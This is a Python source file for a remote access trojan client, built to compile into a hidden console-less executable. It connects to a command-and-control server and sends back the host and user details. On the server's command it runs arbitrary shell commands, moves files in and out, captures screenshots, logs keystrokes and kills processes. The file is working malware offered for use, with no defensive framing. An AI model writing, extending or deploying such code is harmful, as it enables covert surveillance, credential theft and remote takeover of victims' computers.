#!/usr/bin/env python3
"""
RAT Python Client - Standalone executable for remote access
Compile with: pyinstaller --onefile --noconsole --icon=icon.ico rat_python_client.py
"""

import socket
import json
import os
import sys
import subprocess
import base64
import platform
import threading
import time
import hashlib
import random
import string
import shutil
from pathlib import Path

try:
    import psutil
except ImportError:
    psutil = None

# Configuration
C2_HOST = "localhost"
C2_PORT = 8443
RECONNECT_DELAY = 5

class RATClient:
    def __init__(self):
        self.client_id = self.generate_client_id()
        self.socket = None
        self.running = False
        self.keylogger_active = False
        self.keylog_thread = None
        
    def generate_client_id(self):
        """Generate unique client ID"""
        return 'client_' + hashlib.sha256(
            platform.node().encode() + str(random.random()).encode()
        ).hexdigest()[:16]
    
    def connect(self):
        """Connect to C2 server via Socket.IO"""
        try:
            from socketio import Client as SocketIOClient
            
            self.socket = SocketIOClient()
            self.socket.connect(f'http://{C2_HOST}:{C2_PORT}')
            self.socket.on('command', self.on_command)
            self.socket.on('disconnect', self.on_disconnect)
            
            # Send client info
            client_info = {
                "type": "client_info",
                "client_id": self.client_id,
                "os": platform.system(),
                "hostname": platform.node(),
                "username": os.getlogin(),
                "platform": platform.machine()
            }
            self.socket.emit('client_info', client_info)
            
            self.running = True
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
    
    def send_json(self, data):
        """Send JSON data through Socket.IO"""
        try:
            if self.socket and self.socket.connected:
                self.socket.emit('command_result', data)
                return True
            return False
        except Exception as e:
            print(f"Send error: {e}")
            return False
    
    def emit(self, event, data):
        """Emit event through Socket.IO"""
        try:
            if self.socket and self.socket.connected:
                self.socket.emit(event, data)
                return True
            return False
        except Exception as e:
            print(f"Emit error: {e}")
            return False
    
    def on_command(self, data):
        """Handle incoming commands from server"""
        try:
            result = self.execute_command(data)
            if result and 'command_id' in result:
                self.socket.emit('command_result', result)
        except Exception as e:
            print(f"Command execution error: {e}")
    
    def on_disconnect(self):
        """Handle disconnection"""
        print("Disconnected from server")
        self.running = False
    
    def execute_command(self, command):
        """Execute shell commands and return output"""
        try:
            if command.get('type') == 'shell':
                cmd = command.get('cmd', 'dir')
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    "type": "command_result",
                    "command_id": command.get('command_id'),
                    "output": result.stdout,
                    "error": result.stderr,
                    "exit_code": result.returncode
                }
            
            elif command.get('type') == 'file_download':
                filepath = command.get('path', '')
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        content = base64.b64encode(f.read()).decode()
                    return {
                        "type": "file_content",
                        "command_id": command.get('command_id'),
                        "filename": os.path.basename(filepath),
                        "content": content,
                        "size": os.path.getsize(filepath)
                    }
                return {
                    "type": "error",
                    "command_id": command.get('command_id'),
                    "message": f"File not found: {filepath}"
                }
            
            elif command.get('type') == 'file_upload':
                filepath = command.get('path', '')
                content = command.get('content', '')
                try:
                    with open(filepath, 'wb') as f:
                        f.write(base64.b64decode(content))
                    return {
                        "type": "file_uploaded",
                        "command_id": command.get('command_id'),
                        "path": filepath,
                        "success": True
                    }
                except Exception as e:
                    return {
                        "type": "error",
                        "command_id": command.get('command_id'),
                        "message": str(e)
                    }
            
            elif command.get('type') == 'screenshot':
                return self.capture_screenshot(command)
            
            elif command.get('type') == 'keylogger_start':
                return self.start_keylogger(command)
            
            elif command.get('type') == 'keylogger_stop':
                return self.stop_keylogger(command)
            
            elif command.get('type') == 'process_list':
                return self.get_process_list()
            
            elif command.get('type') == 'kill_process':
                return self.kill_process(command)
            
            elif command.get('type') == 'system_info':
                return self.get_system_info()
            
            else:
                return {
                    "type": "error",
                    "command_id": command.get('command_id'),
                    "message": f"Unknown command type: {command.get('type')}"
                }
                
        except subprocess.TimeoutExpired:
            return {
                "type": "error",
                "command_id": command.get('command_id'),
                "message": "Command timed out"
            }
        except Exception as e:
            return {
                "type": "error",
                "command_id": command.get('command_id'),
                "message": str(e)
            }
    
    def capture_screenshot(self, command):
        """Capture screenshot (Windows only with PIL)"""
        try:
            import mss
            with mss.mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                img = mss.tools.to_png(screenshot.rgb, screenshot.size)
                content = base64.b64encode(img).decode()
                return {
                    "type": "screenshot",
                    "command_id": command.get('command_id'),
                    "width": screenshot.size[0],
                    "height": screenshot.size[1],
                    "content": content
                }
        except ImportError:
            return {
                "type": "error",
                "command_id": command.get('command_id'),
                "message": "mss module not installed"
            }
        except Exception as e:
            return {
                "type": "error",
                "command_id": command.get('command_id'),
                "message": str(e)
            }
    
    def start_keylogger(self, command):
        """Start keylogger"""
        if self.keylogger_active:
            return {
                "type": "error",
                "command_id": command.get('command_id'),
                "message": "Keylogger already running"
            }
        
        self.keylogger_active = True
        self.keylog_data = []
        
        # Start keylogger in separate thread
        self.keylog_thread = threading.Thread(target=self._keylogger_loop)
        self.keylog_thread.daemon = True
        self.keylog_thread.start()
        
        return {
            "type": "keylogger_started",
            "command_id": command.get('command_id'),
            "status": "running"
        }
    
    def _keylogger_loop(self):
        """Keylogger main loop"""
        try:
            if platform.system() == 'Windows':
                import keyboard
                keyboard.start_recording()
                time.sleep(5)  # Capture for 5 seconds
                recorded = keyboard.stop_recording()
                for event in recorded:
                    if event.event_type == 'down':
                        if event.name == 'space':
                            self.keylog_data.append(' ')
                        elif len(event.name) == 1:
                            self.keylog_data.append(event.name)
                        else:
                            self.keylog_data.append(f'[{event.name}]')
            else:
                # Simple time-based log for non-Windows
                self.keylog_data.append(f"Keylogger running on {platform.system()}")
                self.keylog_data.append(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        except ImportError:
            self.keylog_data.append("keyboard module not available")
        except Exception as e:
            self.keylog_data.append(f"Error: {str(e)}")
    
    def stop_keylogger(self, command):
        """Stop keylogger and send logs"""
        if not self.keylogger_active:
            return {
                "type": "error",
                "command_id": command.get('command_id'),
                "message": "Keylogger not running"
            }
        
        self.keylogger_active = False
        time.sleep(0.5)  # Allow thread to stop
        
        logs = ''.join(self.keylog_data)
        self.keylog_data = []
        
        return {
            "type": "keylogger_data",
            "command_id": command.get('command_id'),
            "logs": logs,
            "status": "stopped"
        }
    
    def get_process_list(self):
        """Get list of running processes"""
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(
                    ['tasklist'],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    "type": "process_list",
                    "command_id": None,
                    "processes": result.stdout
                }
            else:
                result = subprocess.run(
                    ['ps', 'aux'],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    "type": "process_list",
                    "command_id": None,
                    "processes": result.stdout
                }
        except Exception as e:
            return {
                "type": "error",
                "command_id": None,
                "message": str(e)
            }
    
    def kill_process(self, command):
        """Kill a process"""
        try:
            pid = command.get('pid', '')
            if platform.system() == 'Windows':
                subprocess.run(['taskkill', '/PID', pid, '/F'])
            else:
                subprocess.run(['kill', '-9', pid])
            return {
                "type": "process_killed",
                "command_id": command.get('command_id'),
                "pid": pid,
                "success": True
            }
        except Exception as e:
            return {
                "type": "error",
                "command_id": command.get('command_id'),
                "message": str(e)
            }
    
    def get_system_info(self):
        """Get system information"""
        return {
            "type": "system_info",
            "client_id": self.client_id,
            "os": platform.system(),
            "os_version": platform.version(),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "hostname": platform.node(),
            "username": os.getlogin(),
            "memory": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB" if 'psutil' in sys.modules else "N/A"
        }


def main():
    """Main entry point"""
    client = RATClient()
    
    print(f"RAT Client starting... ID: {client.client_id}")
    
    # Connect to server
    while not client.connect():
        print(f"Reconnecting in {RECONNECT_DELAY} seconds...")
        time.sleep(RECONNECT_DELAY)
    
    print("Connected to C2 server")
    
    try:
        # Keep client running and processing
        while client.running:
            time.sleep(1)
            # Send heartbeat periodically
            try:
                client.socket.emit('heartbeat', {"client_id": client.client_id})
            except Exception as e:
                print(f"Heartbeat error: {e}")
                client.running = False
    except KeyboardInterrupt:
        print("\nClient stopped by user")
    finally:
        if client.socket:
            client.socket.disconnect()


if __name__ == "__main__":
    main()
